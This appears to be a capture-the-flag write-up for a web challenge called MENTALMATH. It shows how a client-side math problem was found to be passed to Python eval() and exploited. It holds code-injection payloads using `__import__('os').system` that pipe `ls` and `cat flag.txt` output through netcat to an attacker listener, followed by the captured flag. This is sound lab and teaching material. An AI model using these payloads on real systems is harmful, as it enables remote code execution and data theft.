# MENTALMATH

- Math problem can be forged at userside
- Changed problem to `1 + 2 + 3` and sent `6`. Correct.
- Invalid problem such as `&DN` gives 500 response code.
- Guess serverside uses some kind of `eval()` function.
- Let problem be `len('1234')` and sent `4`. Correct!
- It seems python!.
- Listen by `nc -lvp [PORT]`.
- Make problem `__import__('os').system('ls | nc [IP] [PORT]')`

```
db.sqlite3
flag.txt
manage.py
mathgame
mentalmath
requirements.txt
```

- Make problem `__import__('os').system('cat flag.txt | nc [IP] [PORT]')`

```
gigem{1_4m_g0od_47_m4tH3m4aatics_n07_s3cUr1ty_h3h3h3he}
```

- `manage.py`

```python
#!/usr/bin/env python
import os
import sys

if __name__ == '__main__':
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mentalmath.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)
```
